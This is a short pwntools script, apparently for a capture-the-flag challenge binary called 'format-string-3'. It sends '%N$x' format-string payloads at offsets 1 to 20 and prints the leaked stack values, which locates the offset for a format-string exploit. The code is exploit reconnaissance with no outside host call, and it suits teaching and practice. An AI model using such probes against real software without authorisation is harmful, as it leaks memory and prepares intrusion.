from pwn import *

# Define the binary
elf = context.binary = ELF('./format-string-3', checksec=False)

# Create the process
p = process('./format-string-3', level='error')

# Receive and print the initial response
initial_message = p.recvline().decode()
print("Initial Message:", initial_message)

# Set the maximum number of offsets to test (adjust if needed)
max_offsets = 20

# Loop through possible stack offsets
for i in range(1, max_offsets + 1):
    try:
        # Send the format string payload with the current offset
        p.sendline(f"%{i}$x".encode())
        
        # Receive and decode the result
        result = p.recvline().decode().strip()
        
        # Print the offset and the corresponding value on the stack
        print(f"Offset {i}: {result}")
        
    except EOFError:
        # If the process closes unexpectedly, end the loop
        print("Reached end of process output or process closed.")
        break

# Clean up
p.close()

